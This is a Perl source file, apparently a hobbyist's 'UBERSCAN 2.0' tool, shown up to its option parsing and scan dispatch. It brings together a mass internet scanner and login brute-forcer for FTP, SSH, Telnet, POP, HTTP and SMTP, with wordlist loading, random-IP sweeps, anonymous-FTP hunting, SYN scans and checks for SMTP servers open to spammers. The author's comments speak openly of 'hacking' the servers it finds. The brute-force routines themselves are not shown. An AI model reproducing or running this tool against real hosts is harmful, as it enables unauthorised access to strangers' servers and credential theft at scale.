#!/usr/bin/perl
#
#
#
#		*** UBERSCAN ***
#
#	Project to wrap all my wardialler / scanners into one!
#
#
# Copyright 2017 Batch McNulty
#
# Protected by the GNU Public Licence V3.0
#
# As of April 2017 you can contact me at batchmcnulty@protonmail.com
#





###################### AFTER A LONG REST COMING BACK IN 2020
#
# It's almost finished - I just have to cure the feature-itis.


=begin commment  dont' use this code!

* Split into everyday features and advanced features. 
* By default, show everyday features help, with an -adv rider, advanced features
* By default, it should show servers it's found


=end comment;
=cut

#
# ####################################################################################


# ISSUE: When selecting UDP scan, defaults to scanning Port 0 (which isn't a real UDP port)

# add search for a BGP server it sends a BGP request etc? 

# Things to add to UDP scan:
# Selecting string to send by scan (so if you seach for a time server it sends a time request,
# Being able to add your own string to the "string to send" doobrie
# (DONE - see commandchr.pl in parent directory) 
# ALSO maybe have a string to send in TCP mode ("banner" scans)
# Pre-cooked strings, like the clock thing as well as the roll your own feature.
# maybe even a "send random gibberish" function, that could be fun


# Think about taking some options away as well. 
# Not much point replicating an NMAP style UDP scan, when, er... 
# NMAP already does that much better than I ever could.

# On the other hand, this is much easier to use than NMAP.

# Portscan might not be neccesary in UDP mode - check that out!
# (think UDP switches that off anyway)
# Another thing: Add better logging. Currently defaults to no logging of failed conns


# make the UDP scan default to port 123, Network Time Protocol to go with the 
# default sendstring which is also a NTP query.



# Created random options. 
# Fake originating IP?

# Allow user to specify length of random string.
# Also add TCP to "sendstring" - make it so it can be sent in banner scan.
# Also, add a "sendfirst / sendsecond" option.



#Implement the following:

#	-stringlength:nn  Specifies length of random string. "; DONE

#	-stringorder:1			Transmit string first, before a reply is recieved (default in UDP mode)";
#	-stringorder:2  		Transmit string after a reply has been recieved"; (default in TCP mode)";
#	-stringorder:both 	Try transmitting both ways";
#	-stringorder:random	Decide randomly";

# THIS IS A LOT HARDER THAN IT LOOKS!
# * POSSIBLY CAN'T BE DONE WITH UDP
# * Requires either MAJOR surgery to HackBanner() or entirely new routine just for this hack

# Create a HackCustom() routine?


# Implement "pre-rolled" strings: HTTP request

#### BIG PROBLEM ####

# -random_ip NO LONGER WORKS in banner or UDP mode!
# they all default to port 0!
# banner and UDP die after 1 try in random mode even if a port is specified

# THINK I've fixed it! turns out to have been input error.
# Yeah, that's sorted. Problem solved, leaving in case it comes back

#Other things to do:
#Custom "nmap" style TCP portscan

# -synscan  implemented but NOT tested.
# OK, a little bit of testing has shown it to be a bit slower than vanilla portscan 
#  - at least when done through a proxy

# Got it stabilized at around 1700 ips/min
# - needs to be higher than 2000 to compete with fresh proxies
# Also need to get its ability to find open ports more integrated into the program
# especially as regards "banner" scans - alternative to this is to search for open ports
# perhaps a new option called -searchopen where it just searches for open ports
# without trying to hack them

# Would have to replace scantype at some point in the program
# while allowing the user to still use scantype:foo 

# DON'T have it imply -nmap_portscan though - it can be its own thing

# OK. Project searchopen

# Doesn't seem to need many retransmissions, can get by with 5 easily.


# Check UDP and string_to_send works properly
# - defaults to UDP Time request (can't remember which, might be NTP)
# 
# Add code to save new Telnet servers in FOUND_TELNET_SERVERS.txt


#    ***************** 2020 ******************

# Ideas: 
#	to SCANTYPE option, add ALL. 



use strict;

no warnings;

use Fcntl qw/:DEFAULT :flock/;
use utf8;

#use Encoding::FixLatin qw (fix_latin);
use Encode qw(decode encode);
use Scalar::Util qw(looks_like_number);

our $syn_result;
our $megahack;							# For port-scanning (mainly UDP)
my @input = @ARGV;
my $ipspace = "undefined";
my $numinputs = scalar @input;
my $username = "undefined";
my $password = "undefined";

my $numofips = "undefined";

our $ip_filename = "ipnumbers.txt";
our @filecontents_array = "";
our $filecontents_string = "";
our $options = "undefined";

our $ip_count = 0;
our $curr_ip = "undefined";
our @ip_array = "";
our $socket = "undefined";
our $remote_host = "undefined";
our $remote_port = "0";
our $protocol = "tcp";
our $reply = "";
our $output = "undefined";

### mass-popcrack stuff ###

our $error_result = "500";
our $usernamelogon = "undefined";
our $passwordtry = "undefined";

### wordlist stuff ###

our $wordlist_filename = "undefined";
our $numofusernames = 0;
our $numofpasswords = 0;
our @word_array = "";
our @password_array = "";
our @username_array = "";
our $password_count = 0;
our $username_count = 0;

## error handling ##

our $conn_error = "no";
our $retry = 0;
our $max_retries = 5;
our $max_retries_option = "";


#### Fixed inputs, program update ####

my $username_option = "undefined";
my $password_option = "undefined";
our $ip_option = "";						
my $ip_option_offset;

our $userfile = "undefined";
our $passfile = "undefined";

### ipblock_gen #####

our $ip_input = "undefined";


#### range_gen ####

our $first_ip = "undefined";
our $second_ip = "undefined";


#### external commands including whois scan on found machines ####

our $cmd = "undefined";
our $shell ="undefined";


### New input system ###

our @input_matches = "undefined";
$input_matches[0] = "undefined";

our $index_of_first_ip = 0;
our $index_of_second_ip = 0;

### New options: -scantype: -port: and -whois

our $scan_option = "undefined";
our $scantype = "undefined";

our $port_option = "undefined";
our $port = "undefined";

our $whois_option = "OFF";


### -ftpanon option ###

our $ftpanon = "undefined";


### -smtpbug option ####

our $smtpbug = "undefined";

######### error_correct ###########

our $running_error_correct = 'NO';

######## HackTelnet (Net::Telnet version)

# our @telnet_output = "undefined";
# our $telnet_output_array_loopcount = 0;
# our $telnet = "undefined";



####### HackHTTP stuff ######

our $return_code;
our $response_code;
our $foreign_headers;



####### Multitasking ################

our $forktimes = 0;
our $forktimes_option = "forktimes_option: Undefined";

########### Time ####################

our $starttime = time();
our $timenow = 0;
our $uptime = 0;

our $times_looped = 0;
our $ips_generated = 0;
our $forkcount = 0;
our $minutesup;
our $ipspermin;

our $maxmins;

##### New report file writer, w/ file locking ###########

our $filename;
our $verbal_report;


###### -noportscan option: ##################
our $port_scan_option;
our $port_test;

####### -synscan #########
our $synscan_option;
our $synscan;
our $syn_timeout = 210000;	# Looks like the sweet spot!
my $syn_timeout_option;

#our $syn_trans_attempts = 5;
our $syn_trans_attempts = 4;
my $syn_trans_attempts_option;

our $syn_trans_factor = (($syn_timeout) / $syn_trans_attempts);

print "\n syn_trans_factor is $syn_trans_factor\n";

# $syn_trans_factor has to be recalculated if we change timeout or retrans attempts
# It's this way so we don't have to waste cycles recalcing it and 
# so we don't retransmit on the last cycle before we give up



####### -debug and -logall options  ###################
our $debug_option;
our $debug;

our $logall_option;
our $logall;

######## -timeout and -portscan_timeout options #########

our $timeout_option;
our $timeout = 30;

our $portscan_timeout_option;
our $portscan_timeout = 1;


##### a save to file (unimplemented) ###########

our $save_to_passfile;

#### Yet more debugging, it's important though.####
# $banner is a variable for the first reply, so we can save banners
# and for the -scantype:banner option 
#
# The $addenda variable allows each file-writing subroutine to write a specific comment ###
# on something that's happened. ###

our $banner;
our $addenda;


################### a null variable for the stupid "press ENTER to continue" bit #########

my $nothing;


######## -pause option #####################
my $pause_option;

######## -spamcheck and -novrfy options ###################

my $spamcheck_option;
my $novrfy_option;

############ Stops searching when a password is found (random mode only for now, sorry) ######

our $login_found;

##### CSV mode ##############

our $csv_option;


###### GPL "mode" #############

our $gpl_option;

####### String to send in UDP scans. ####
# It defaults to a UDP TIME REQUEST 
my $string_to_send_option;

our $string_to_send = chr(27);
our $string_to_send .= chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0);
our $string_to_send .= chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0);
our $string_to_send .= chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0);
our $string_to_send .= chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0);
our $string_to_send .= chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0);



######## More strings to send: #######

our $prerolled_http_request = "GET / HTTP/1.1";
our $prerolled_http_request .= chr(13).chr(12);
our $prerolled_http_request .= "Host: www.example.com";
our $prerolled_http_request .= chr(13).chr(12);
our $prerolled_http_request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)";
our $prerolled_http_request .= chr(13).chr(12);

#print "\n***************************************";
#print "\nprerolled http: $prerolled_http_request";
#print "\n***************************************";
#die;
###### Machinery for changing that string using nonprintable characters ####

my $chr_count = 0;
my $delimited_chr_codes;
my @chr_codes;

our $stringlength_option;
our $random_string_length = 0;

########## Order in which string is transmitted ###########################

my $stringorder_option;
our $stringorder;


################################
our $customhack_option;


################################# VALIDATE INPUT #########################################


unless ($numinputs > 1
|| $input[0] eq '-gpl'
|| $input[0] eq '-GPL'
|| $input[0] eq '-ftpanon'
|| $input[0] eq '-smtpbug'
|| $input[0] =~ "banner"
|| $input[0] =~ "Banner"
|| $input[0] =~ "BANNER"
|| $input[0] =~ "udp"
|| $input[0] =~ "UDP"
)	{
	print "\n ERROR - this program requires at least two inputs.\n";		
	PrintOptions();
	die "\n";
}


print "\n \t\t *** UBERSCAN 2.0 *** ";

############### Debugging, comment out on completion #############
#print "\n username_option: $username_option \n ";
#print "\n password_option: $password_option \n ";
#print "\n ip_option: $ip_option \n ";
#print "\n forktimes: $forktimes \n";
#print "\n input_matches: @input_matches \n";
#print "\n input: @input \n";

print "\n";


##################### Display GPL if required ##########################

@input_matches = grep { /-gpl|-GPL/ } @input;
$gpl_option = $input_matches[0];

if ($gpl_option eq '-gpl' || $gpl_option eq '-GPL')	{
	print "\n";
	PrintGPL();
	die;
}

#######################  Accept a string for UDP scanning / l33t hax0ring ##########
@input_matches = grep  { /-sendstring:/ } @input;
$string_to_send_option = $input_matches[0];

print "\n ********** string_to_send_option:";
print $string_to_send_option;
if ($string_to_send_option =~ '-sendstring:')	{# BOOKMARK - DOUBLE CHECK THIS
	$string_to_send = substr ($input_matches[0], 12); # as I fucked with it! (fixed it, seems OK)
	chomp $string_to_send;
	if ($string_to_send =~ "prerolled_http_request")	{
		$string_to_send = $prerolled_http_request;
	}
	$string_to_send .="\n";
	print "\n String to send in UDP / Custom TCP scan:$string_to_send";
}
#else {
#	print "\n No printable string has been supplied for UDP, searching for nonprinting string\n";
#}
#######################  Accept a nonprinting string for UDP scanning ##########
#@input_matches = grep  { /-sendstring_np:/ } @input;
#	$string_to_send_option = $input_matches[0];

	# BOOKMARK

elsif ($string_to_send_option =~ '-sendstring_np:')	{
	$string_to_send = '';
	$delimited_chr_codes = substr ($input_matches[0], 15);	# BOOKMARK - DOUBLE CHECK THIS, 
																				# or was it this I fucked with?
																				# (fixed it, seems OK)
	print "\n delimited_chr_codes:\t".$delimited_chr_codes;
	
	foreach ($delimited_chr_codes)	{
		@chr_codes = split(',',$_);
		print "\n";
		print '$_:'."\t\t\t".$_;
		print "\nchr_codes:\t\t";
		print @chr_codes;	
		
		#@string_to_send_arr = chr(split ",",$_);
	}
	print "\n\n";

	until ($chr_count == scalar(@chr_codes))	{
		$string_to_send .= chr($chr_codes[$chr_count]);
		$chr_count++;
	}
	print "\n string_to_send are: ";
	print $string_to_send;
	$chr_count = 0;
		
	
	chomp $string_to_send;	# I'm not sure about that - let's test it!
	$string_to_send .="\n";
	print "\n String to send in UDP scan:$string_to_send";
}
else {
	print "No string has been supplied for UDP - sending $string_to_send (defaults to time request)";
}

@input_matches = grep { /-stringlength:/ } @input;
$stringlength_option = $input_matches[0];

if ($stringlength_option =~ "-stringlength:")	{
	$random_string_length = substr ($input_matches[0], 14);
	print "Length of random string is user set to:$random_string_length";
}


#################### Process -whois option ##################
@input_matches = grep { /-whois|-WHOIS/ } @input;
$whois_option = $input_matches[0];

if ($whois_option eq '-whois' || $csv_option eq '-WHOIS')	{
	print "\n whois option is ON. Will do a WHOIS search on any hacked IP addresses and put";
	print "\n the results in whoisreport.txt.";
	print "\n";
	$whois_option = "ON";
}


#################### Process -csv option to enable CSV mode #############

@input_matches = grep { /-csv|-CSV/ } @input;
$csv_option = $input_matches[0];

if ($csv_option eq '-csv' || $csv_option eq '-CSV')	{
	$csv_option = "ON";
	print "\n CSV mode ON. All output files except downloaded webpages will be in CSV mode ";
	print "in format: Scantype,IP address,port,username,password,minutesup";
	print "\n";
}


#################### Process -spamcheck and -novrfy options ###########

### -spamcheck ###

@input_matches = grep { /-spamcheck/ } @input;
$spamcheck_option = $input_matches[0];

if ($spamcheck_option eq '-spamcheck' || $spamcheck_option eq '-SPAMCHECK') {
	$spamcheck_option = "ON";
	print "\n Spammer vulnerability checking ON. (SMTP scantype only)";
	print "\n";
}

### -novrfy ###

@input_matches = grep { /-novrfy/ } @input;
$novrfy_option = $input_matches[0];

if ($novrfy_option eq '-novrfy' || $novrfy_option eq '-NOVRFY') {
	$novrfy_option = "ON";
	$spamcheck_option = "ON";	
	$username_option = '-user:not_applicable_no_vrfy_option_selected';
	# Above kludge resolves a bug-ette which stopped -novrfy from working.
	print "\n VRFY commands switched OFF, spammer vulnerability checking ON (SMTP only)";
	print "\n";
}





################## Process -timeout option ###################
@input_matches = grep { /-timeout:/ } @input;
$timeout_option = $input_matches[0];

if ($timeout_option =~ '-timeout:')	{
	print "\n -timeout option selected. ";
	print "\n The timeout for connections has been re-set to ";
	$timeout = substr ($input_matches[0], 9);
	print "$timeout \n";
}


################## Process -portscan_timeout option ###################
@input_matches = grep { /-portscan_timeout:/ } @input;
$portscan_timeout_option = $input_matches[0];

if ($portscan_timeout_option =~ '-portscan_timeout:')	{
	print "\n -portscan_timeout option selected. ";
	print "\n The timeout for the portscanner has been re-set to ";
	$portscan_timeout = substr ($input_matches[0], 18);
	print "$portscan_timeout \n";
	print "\n";
}



############## Process -debug option ########################

@input_matches = grep { /-debug/ } @input;
$debug_option = $input_matches[0];

if ($debug_option eq '-debug')	{
	print "\n -debug option selected. Files will be generated to reflect various errors, ";
	print "failed attempts to re-try connections, and webpages downloaded by the ";
	print " -httpscan option (where applicable)";
	print "\n";
	$debug = "ON";
}


############## Process -logall option ########################


@input_matches = grep { /-logall/ } @input;
$logall_option = $input_matches[0];

if ($logall_option eq '-logall')	{
	print "\n -logall option selected. Files will be generated logging EVERY error, ";
	print "even the extremely commonplace ones that would usually drown out the ";
	print "interesting ones.";
	print "\n";
	$debug = "ON";
	$logall = "ON";
}




################## Process -noportscan option ###############

@input_matches = grep { /-noportscan/ } @input;
$port_scan_option = $input_matches[0];

if ($port_scan_option eq '-noportscan')	{
	print "\n Port scan off, will assume target port's open when hacking ";	
	undef ($port_scan_option);
}
else {
	$port_scan_option = "ON";
	print "\n Port scan enabled (default), will test to see if port's open before trying to ";
	print "hack it";
}

print "\n";


################## Process -synscan option ###########

@input_matches = grep { /-synscan/ } @input;
$synscan_option = $input_matches[0];

if ($synscan_option eq '-synscan')	{
	$synscan = "ON";
}


################## Process -syn_timeout option ###########

@input_matches = grep { /-syn_timeout:/ } @input;

$syn_timeout_option = $input_matches[0];

if ($syn_timeout_option =~ '-syn_timeout:')	{
	
	$syn_timeout = substr ($input_matches[0], 13);

	$syn_trans_factor = ($syn_timeout / $syn_trans_attempts);
	
	print "\n SYN timeout value adjusted to $syn_timeout cycles";
	print "\n SYN packet transmission attempts are $syn_trans_attempts";
	print "\n syn_trans_factor is now $syn_trans_factor\n";
	
}

################## Process -syn_trans_attempts option ###########

@input_matches = grep { /-syn_trans_attempts:/ } @input;

$syn_trans_attempts_option = $input_matches[0];

if ($syn_trans_attempts_option =~ '-syn_trans_attempts:')	{
	$syn_trans_attempts = substr ($input_matches[0], 20);
	
	
	
	print "\n SYN packet transmission attempts adjusted to $syn_trans_attempts";
	print "\n SYN timeout value is $syn_timeout";
	$syn_trans_factor = ($syn_timeout / $syn_trans_attempts);
	print "\n syn_trans_factor is now $syn_trans_factor\n";
}


################### Process -smtpbug option to find SMTP bug(s) ################

@input_matches = grep { /-smtpbug/ } @input;
$smtpbug = $input_matches[0];

if ($smtpbug eq '-smtpbug')	{
	$scantype = 'SMTP';
	$scan_option = '-scantype:SMTP';
	$username_option = '-user:not_applicable_when_smtpbug_option_selected';
	# Minor bug of what happens if I try to search for an SMTP username called "debug"?
	# resolved by creating a stupid fake $username_option
	print "\n -smtpbug scan selected \n";
}



################################ Process -maxmins option ################

@input_matches = grep { /-maxmins:/ } @input;
$maxmins = substr($input_matches[0], 9);

if ($maxmins) {
	print "\n OK, maxmins set to $maxmins. I will stop running after $maxmins minutes \n";
}
else {
	print "\n -maxmins option not set, will run until I'm finished (or forever if a random_ip option has been set)";
}
print "\n";




################################ Process -ftpanon option ################

@input_matches = grep { /-ftpanon/ } @input;
$ftpanon = $input_matches[0];

if ($ftpanon eq '-ftpanon')	{
	$scantype = 'FTP';
	$scan_option = '-scantype:FTP';
	$username_option = '-user:ftp';
	$password_option = '-pass:ftp';
	print "\n -ftpanon (scan for anonymous FTP servers) selected \n";
}


################ Process forktimes option (multitasking) #######################

@input_matches = grep { /-forktimes:/ } @input;
$forktimes_option = @input_matches[0];

if ($forktimes_option =~ '-forktimes:')	{
	$forktimes = substr (@input_matches[0], 11);
	print "\n forktimes set to $forktimes ";
}
print "\n";
if ($forktimes >0) {print "\n Multitasking mode selected, will run $forktimes processes in parallel\n";}
else {print " Single-task mode selected... \n";}




################# Process and act on max_retries option ####################################

@input_matches = grep { /max_retries/ } @input;
print "\n input_matches: @input_matches \n";
$max_retries_option = $input_matches[0];
if ($max_retries_option =~ '-max_retries:')	{
	$max_retries = substr ($input_matches[0], 13);

	if (length($max_retries) == 0)	{ 		# Detect blank input
		die "oops! You didn't give the max_retries option a number. \n Usage: -max_retries:20 (for example)\n";
	}
	print "\n max_retries set to $max_retries \n";
}
else	{
	print "\n max_retries set to default value of $max_retries \n";
}


############ Process scan type option (errors corrected in HackMaster() #################

unless ($ftpanon eq '-ftpanon' || $smtpbug eq '-smtpbug')	{
	@input_matches = grep { /-scantype:/ } @input;
	$scan_option = $input_matches[0];
}

print "\n";
print "scan_option is $scan_option";
print "\n";
if ($scan_option =~ '-scantype:')	{
	print "Scan option selected. Good.";
	print "\n";
	$scantype = substr ($scan_option,10);		# BOOKMARK POSS BUG of bad banner search
	print "Scan type is: $scantype \n \n";
}
else {
	print "\n\n YOU DID NOT ENTER A SCAN TYPE.";
	print "\n (\$scantype = $scantype)";
	print "\n (Check to see if you entered the '-scantype:' option before the actual scan type)";
	print "\n";
	PrintScanOptions();
	print "\n ";
	die "\n\n Didn't enter a scan type. I'm very dissapointed in you, Dick. \n\n";
}

######################### Process stringorder option ####################
@input_matches = grep { /-stringorder:/ } @input;
$stringorder_option = $input_matches[0];

print "\n";
print "Stringorder_option:$stringorder_option";
print "\n";
if ($stringorder_option eq "-stringorder:1")	{
	$stringorder = 1;
	print  "(I will transmit custom string first)";
}
elsif ($stringorder_option eq "-stringorder:2")	{
	$stringorder = 2;
	print "(I will wait to recieve a string before transmitting)";
}
elsif ($stringorder_option eq "-stringorder:both")	{
	$stringorder = "both";
	print "(I will do both, somehow)";
}
elsif ($stringorder_option eq "-stringorder:random")	{
	$stringorder = "random";
	print "(I will switch around at random)";
}
else {
	print "No string order option selected, will default according to scan type- UDP will transmit first, Banner mode (TCP) will do it second";
	$stringorder = "default";
}



##################### Process port option (if entered) ##########################

@input_matches = grep { /-port:/ } @input;
$port_option = $input_matches[0];
print "\n";
print "port_option is $port_option";
print "\n";
if ($port_option =~ '-port:')	{
	$port = substr($port_option, 6);	# Sets port to value in $port_option
	$remote_port = $port;
	print "\n Port: $port remote_port: $remote_port \n";
	
}
else	{
	print "Port option not set, deciding by scan";
	if ($scantype eq "SSH" || $scantype eq "ssh")	{$remote_port = 22;}
	if ($scantype eq "FTP" || $scantype eq "ftp")	{$remote_port = 21;}
	if ($scantype eq "HTTP" || $scantype eq "http") {$remote_port = 80;}
	if ($scantype eq "Telnet"|| $scantype eq "telnet" || $scantype eq "TELNET"){$remote_port = 23;}
	if ($scantype eq "POP2" || $scantype eq "pop2") {$remote_port = 109;}	
	if ($scantype eq "POP3" || $scantype eq "pop3") {$remote_port = 110;}
	if ($scantype eq "SMTP" || $scantype eq "smtp") {$remote_port = 25;}
	if ($scantype eq "Banner" || $scantype eq "banner" || $scantype eq "BANNER") {$remote_port = 1433;}
	if ($scantype eq "Searchopen" || $scantype eq "searchopen" || $scantype eq "SEARCHOPEN") {$remote_port = 1433;}
	if ($scantype eq "udp" || $scantype eq "UDP" || $scantype eq "Udp") {$remote_port = 123;}
	print "\n Scan type is $scantype, so port is $remote_port \n";
}



############################ Process username #############################################


unless ($ftpanon eq '-ftpanon' ||
$novrfy_option eq "ON" ||
$smtpbug eq '-smtpbug' ||
$scantype =~ 'banner' ||
$scantype =~ 'Banner' ||
$scantype =~ 'BANNER' ||
$scantype =~ 'searchopen' ||
$scantype =~ 'Searchopen' ||
$scantype =~ 'SEARCHOPEN' ||
$scantype =~ 'udp' ||
$scantype =~ 'UDP' )	{
	@input_matches = grep { /-user/ } @input;
	$username_option = $input_matches[0];
}

if ($username_option =~ '-user:')	{
	$username = substr($username_option, 6);
	unless ($novrfy_option eq "ON" or $smtpbug eq '-smtpbug')	{
		print "\n Username is: $username \n";
	}
}
elsif ($username_option =~ '-userblank')	{
	$username = '';
	print "\n Username is set to blank. (Username:$username) See?";
}
elsif ($username_option =~ '-userfile:')	{
	$userfile = substr($username_option, 10);
	print "\n Load usernames from file $userfile \n";
}
elsif ($scantype =~ "banner"||
$scantype =~ "Banner"||
$scantype =~ "BANNER"||
$scantype =~ 'searchopen' ||
$scantype =~ 'Searchopen' ||
$scantype =~ 'SEARCHOPEN' ||
$scantype =~ "CUSTOM"||
$scantype =~ "Custom"||
$scantype =~ "custom"||
$scantype =~ "udp"||
$scantype =~ "UDP")	{
	print "\n No need to load usernames, as doing a banner / UDP search \n"
}
elsif ($novrfy_option eq "ON")	{
	print "\n No need to load usernames as only scanning for spammer-vulnerable SMTP servers";
}
else	{
		PrintOptions();
		statistics();
		print "\n ********* DON'T PANIC - YOU JUST ENTERED THE USERNAME OPTION WRONG ********* ";
		print "\n\n If you're like me, you probably typed -username:username or just";
		print "\n plain forgot to specify a username option.";
		print "\n\n  Specify usernames with either -user:username, or ";
		print "\n -userfile:wordlist.txt to specify a wordlist file.";
		print "\n\n";
		die;
}
 
########################### Process password #############################################

unless ($ftpanon eq '-ftpanon' ||
$scantype eq "SMTP" ||
$scantype eq "smtp" ||
$scantype =~ 'banner'||
$scantype =~ 'Banner'||
$scantype =~ 'BANNER'||
$scantype =~ 'searchopen' ||
$scantype =~ 'Searchopen' ||
$scantype =~ 'SEARCHOPEN' ||
$scantype =~ "CUSTOM"||
$scantype =~ "Custom"||
$scantype =~ "custom"||
$scantype =~ 'udp'||
$scantype =~ 'UDP' )	{
	@input_matches = grep { /-pass/ } @input;
	$password_option = $input_matches[0];
}

unless ($scantype eq "SMTP" ||
$scantype eq "smtp" ||
$scantype =~ 'banner' ||
$scantype =~ 'Banner' ||
$scantype =~ 'BANNER' ||
$scantype =~ 'searchopen' ||
$scantype =~ 'Searchopen' ||
$scantype =~ 'SEARCHOPEN' ||
$scantype =~ "CUSTOM"||
$scantype =~ "Custom"||
$scantype =~ "custom"||
$scantype =~ 'udp' ||
$scantype =~ 'UDP' )	{

	if ($password_option =~ '-pass:')	{
		$password = substr($password_option, 6);
		print "\n Password is: $password";
	}
	elsif ($password_option =~ '-passblank')	{
		$password = '';
		print "\n Password is blank (Password:$password) See?";
	}
	elsif ($password_option =~ '-passfile:')	{
		$passfile = substr($password_option, 10);
		print "\n Load passwords from file $passfile\n";
	}
	else	{
		PrintOptions();
		print "\n ********* DON'T PANIC - YOU JUST ENTERED THE PASSWORD OPTION WRONG ********* ";
		print "\n\n If you're like me, you probably typed -password:password or just";
		print "\n plain forgot to specify a password option.";
		print "\n\n  Specify passwords with either -pass:password, -passblank (to";
		print "\n try blank passwords) or -passfile:wordlist.txt to specify a";
		print "\n wordlist file.";
		print "\n\n";
		die;
	}
}
print "\n";

########################## Process IP range options (if entered) #########################

@input_matches = grep { /-ip|-random_ip/ } @input;
$ip_option = $input_matches[0];

if ($ip_option =~ '-ipblock:' || $ip_option =~ 'iprange:') {
		$ip_option_offset = 9;
}
#	First test for random_ipblock is so I can calculate offset of entered data
if ($ip_option =~ '-random_ipblock:') {	
	$ip_option_offset = 16;
}
#	The second one gets the substring whether it's -ipblock or -random_ipblock
if ($ip_option =~ '-ipblock:' || $ip_option =~ '-random_ipblock:')	{
	print "\n IP block search or random IP block search selected. \n";
	$ip_input = substr ($ip_option, $ip_option_offset);
	print "\n ip_input: $ip_input \n";
}
elsif ($ip_option =~ '-iprange:')	{
	print "\n IP range search selected. \n";
	$first_ip = substr ($ip_option, $ip_option_offset);
	$index_of_first_ip = index (@input, $ip_option);

	until ($input[$index_of_first_ip] eq $ip_option || $index_of_first_ip > $#input)	{
		$index_of_first_ip++;
	}
	$index_of_second_ip = ($index_of_first_ip +2);
	$second_ip = $input[$index_of_second_ip];
	print "\n Scanning ip range from $first_ip to $second_ip \n";

	unless ($second_ip =~ m/\d+\.\d+\.\d+\.\d+/)	{
		print "\n";
		print " ***************************************************";
		print "\n :-( :-( :-( :-( :-( :-( :-(:-(:-( :-( :-( :-(:-( ";
		print "\n YOU DIDN'T ENTER THE SECOND IP ADDRESS YOU DOPE! ";
		print "\n";
		print "\n Format is: -iprange:192.168.0.1 - 192.168.255.255";
		print "\n (INCLUDING spaces and '-' character - important! ";
		print "\n";
		print " ***************************************************";
		print "\n";
	}
}
elsif ($ip_option =~ '-ipfile:')	{
	print "\n IP file seleccted. \n";
	$ip_filename = substr ($ip_option, 8);
	print "ip_filename is $ip_filename";
	print "\n";
}
elsif ($ip_option =~ '-ipsingle:')	{
	$remote_host = substr ($ip_option, 10);
	print "\n remote_host: $remote_host \n";
}
elsif ($ip_option =~ 'random_ip')	{
	print "\n Selected random IP generation \n";
}
else 	{
	$ip_option = '';
	$ip_option = 'undefined';
	print "\n\n No IP option specified, so taking IPs from default file ipnumbers.txt \n";
}

print "\n";
unless ($first_ip eq "undefined") {print "First_ip:$first_ip \n second_ip:$second_ip\n";}




########################## Finally, process "pause" option ###########

@input_matches = grep { /-pause|-PAUSE/ } @input;
$pause_option = $input_matches[0];
if ($pause_option eq '-pause' || $pause_option eq '-PAUSE')	{
	print "\n ****************************\n* I'm all right.... Jack! *\n*****************************\n";
	print "\n Ready to start work. Scroll up to review your options or press 'ENTER' to continue";
	print "\n";
	$nothing = <STDIN>;
	print "\n";
}
else	{
	print "\n ****************************\n* I'm all right.... Jack! *\n*****************************\n";
}







#
# 	#################### END OF OPTIONS PROCESSING #######################
#



############## Execute if using the "udp" scantype option #############

if ($scantype eq "udp" || $scantype eq "UDP")	{
	if ($ip_option =~ '-ipsingle:')	{
		print "\n udp search option with single IP? Bizzare!";
		print "\n Calling HackMaster()...";
		HackMaster();
		print "\n All done, bye now!\n\n";
		NagBitcoin();
		die "\n\n Completed search for udps in one single IP for some reason.\n\n";
	}
	elsif ($ip_option =~ 'undefined' || $ip_option =~ '-ipfile:')	{
		print "\n udp search option selected on port $port taking IPs from file";
		print "\n $ip_filename";
		print "\n Not processing any usernames or passwords, so if you selected any ";
		print "\n you're out of luck. ";
		print "\n Executing GetSomeIPFileCrack()\n";
		GetSomeIPFileCrack();
		print "\n Back from GetSomeIPFileCrack()\n";
		NagBitcoin();
		die "\n\n Finished searching for udps using IPs in $ip_filename! \n\n";
	}
	elsif ($ip_option =~ '-ipblock:')	{
		print "\n Searching for udp in ipblock $ip_array[0] - $ip_array[1]";
		print "Calling ipblock_gen()...";
		print "\n";
		ipblock_gen();
		print "\n Hope you are satisfied with our service and please come again.\n";
		NagBitcoin();
		die "\n\n\n Finished scanning $ip_array[0] - $ip_array[1] for udps on port $port\n\n\n";
	}
	elsif ($ip_option =~ '-random_ip')	{
		print "\n Searching for udp at a random ip. \n";
		print "\n You won't see me again as this loops until you break out, unless";
		print "\n the -maxmins: option has been set, although a seperate subroutine";
		print "\n handles that so... bye bye!";
		random_ip();
		NagBitcoin();
		die "\n\n\n In the unlikely event you see this, something has gone VERY WRONG with the universe! \n\n\n";
	}
	elsif ($ip_option =~ '-iprange:')	{
		print "\n Searching for a udp in IP range between $first_ip and $second_ip";
		print "\n Here comes range_gen()";
		range_gen();
		print "\n Back from range_gen!\n";
		NagBitcoin();
		die "\n\n Finished searching for a udp in IP range between $first_ip and $second_ip \n\n\n";
	}
}




############## Execute if using the "Banner" OR "Custom" scantype option (experimental) #########

if ($scantype eq "Banner" || $scantype eq "banner" || $scantype eq "BANNER" ||
$scantype eq "CUSTOM"|| $scantype eq "Custom"|| $scantype eq "custom" ||
$scantype =~ 'searchopen' || $scantype =~ 'Searchopen' || $scantype =~ 'SEARCHOPEN')	{
	if ($ip_option =~ '-ipsingle:')	{
		print "\n Banner / searchopen search option with single IP? You're weird...";
		print "\n Calling HackMaster()...";
		HackMaster();
		print "\n All done, bye now!\n\n";
		NagBitcoin();
		die "\n\n Completed search for banners / open ports in one single IP for some reason.\n\n";
	}
	elsif ($ip_option =~ 'undefined' || $ip_option =~ '-ipfile:')	{
		print "\n Banner / searchopen search option selected on port $port taking IPs from file";
		print "\n $ip_filename";
		print "\n Not processing any usernames or passwords, so if you selected any ";
		print "\n you're out of luck. ";
		print "\n Executing GetSomeIPFileCrack()\n";
		GetSomeIPFileCrack();
		print "\n Back from GetSomeIPFileCrack()\n";
		NagBitcoin();
		die "\n\n Finished searching for banners / open ports using IPs in $ip_filename! \n\n";
	}
	elsif ($ip_option =~ '-ipblock:')	{
		print "\n Searching for banner / open port in ipblock $ip_array[0] - $ip_array[1]";
		print "Calling ipblock_gen()...";
		print "\n";
		ipblock_gen();
		print "\n Hope you are satisfied with our service and please come again.\n";
		NagBitcoin();
		die "\n\n\n Finished scanning $ip_array[0] - $ip_array[1] for banners / open ports on port $port\n\n\n";
	}
	elsif ($ip_option =~ '-random_ip')	{
		print "\n Searching for banner / open port at a random ip. \n";
